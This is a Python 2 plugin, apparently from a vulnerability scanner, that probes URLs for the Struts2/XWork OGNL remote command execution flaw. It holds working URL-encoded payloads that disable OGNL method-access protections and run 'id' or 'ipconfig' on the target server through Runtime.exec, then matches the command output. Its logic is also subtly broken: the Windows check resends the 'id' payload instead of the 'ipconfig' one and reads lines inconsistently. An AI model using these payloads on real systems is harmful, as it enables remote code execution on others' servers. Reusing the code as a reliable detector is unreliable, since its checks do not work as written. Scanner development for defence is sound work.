#!/usr/bin/python
# -*- coding: utf-8 -*-
import logging
import urllib2
import re
import urlparse
from lib.common import *




def GetTrueUrl(url):
    try:
        parse=urlparse.urlparse(url)
        urls=parse.path
        if urls=="" or urls=="/":
            return url
        urls=url.split("/")
        urls=urls[len(urls)-1]
        if urls=="" or urls.find(".")<0:
            return  url
        else:
            return False     
    except Exception,e:
            logging.getLogger().error(" GetTrueUrl Exception(DirectoryTraversal.py):" + str(e))
            return False

def run_url(http,ob,item):
    try:
        list = []
        url = GetTrueUrl(item['url'])
        if url:
            
            detail = u""
            detail = detail.encode('utf8') 
            test1 = "MyStruts.action?%28%27%5Cu0023_memberAccess[%5C%27allowStaticMethodAccess%5C%27]%27%29%28meh%29=true&%28aaa%29%28%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003d%5Cu0023foo%27%29%28%5Cu0023foo%5Cu003dnew%20java.lang.Boolean%28%22false%22%29%29%29&%28asdf%29%28%28%27%5Cu0023rt.exec%28%22id%22%29%27%29%28%5Cu0023rt%5Cu003d@java.lang.Runtime@getRuntime%28%29%29%29=1"
            test2 = "MyStruts.action?%28%27%5Cu0023_memberAccess[%5C%27allowStaticMethodAccess%5C%27]%27%29%28meh%29=true&%28aaa%29%28%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003d%5Cu0023foo%27%29%28%5Cu0023foo%5Cu003dnew%20java.lang.Boolean%28%22false%22%29%29%29&%28asdf%29%28%28%27%5Cu0023rt.exec%28%22ipconfig%22%29%27%29%28%5Cu0023rt%5Cu003d@java.lang.Runtime@getRuntime%28%29%29%29=1"
            s = urllib2.urlopen("%s%s" % (url,test1))
            if re.search(r"uid=[0-9]{0,20}\(.{0,20}\)\sgid=[0-9]{0,20}\(.{0,20}\)\sgroups=[0-9]{0,20}\(.{0,20}\)",s.read()):
                request = getRequest("%s%s" % (url,test2))
                res = {}
                header = s.info()
                for key in header:
                    res[key] = header[key]
                #end for
                res['status'] = '200'
                response = getResponse(res)
                list.append(getRecord(ob,url,ob['level'],detail,request,response))
                return list

    
            
            yx=urllib2.urlopen("%s%s" % (url,test1))
            if yx.readline().find("IP Address")>=0 and yx.readline().find("Default Gateway")>=0 :
                request = getRequest("%s%s" % (url,test2))
                res = {}
                header = yx.info()
                for key in header:
                    res[key] = header[key]
                #end for
                res['status'] = '200'
                response = getResponse(res)
                list.append(getRecord(ob,url,ob['level'],detail,request,response))
                return list
            #end if

    except Exception,e:
        logging.getLogger().error("File:xworkcommandexecsrcipt.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ", domain id:" + ob['domain_id'] + ", url:" + item['url'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:xworkcommandexecsrcipt.py, run_url function :" + str(e)+ ", url:" + item['url'])
        return list
    #ene  try
#end def




